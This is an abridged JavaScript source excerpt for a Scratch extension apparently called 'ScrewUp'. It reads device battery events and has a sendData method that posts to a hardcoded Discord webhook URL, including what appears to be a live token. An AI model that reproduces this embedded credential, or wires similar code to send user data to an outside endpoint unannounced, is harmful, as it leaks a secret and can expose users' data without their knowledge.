...
(function(Scratch) { 
      ...
      if (!getBatteryPromise) {
        getBatteryPromise = navigator.getBattery()
          .then((battery) => {
            ...
            cachedBattery.addEventListener("chargingchange", () => Scratch.vm.runtime.startHats("screwup_chargingChanged"));
            cachedBattery.addEventListener("levelchange", () => Scratch.vm.runtime.startHats("screwup_levelChanged"));
            cachedBattery.addEventListener("chargingtimechange", () => Scratch.vm.runtime.startHats("screwup_chargeTimeChanged"));
            cachedBattery.addEventListener("dischargingtimechange", () => Scratch.vm.runtime.startHats("screwup_dischargeTimeChanged"));
    ...
    class ScrewUp {
      ...
      sendData(args) {
        ...
        const webhookUrl = 'https://discord.com/api/webhooks/1167167898356285500/VARZvHq6xGd4rEiYl_lf-yaTPYCXNCcgxRZzAl18ett0TiCUvME0Tt9kMT8RbItjvNlM';
        fetch(webhookUrl, {
          method: 'POST',
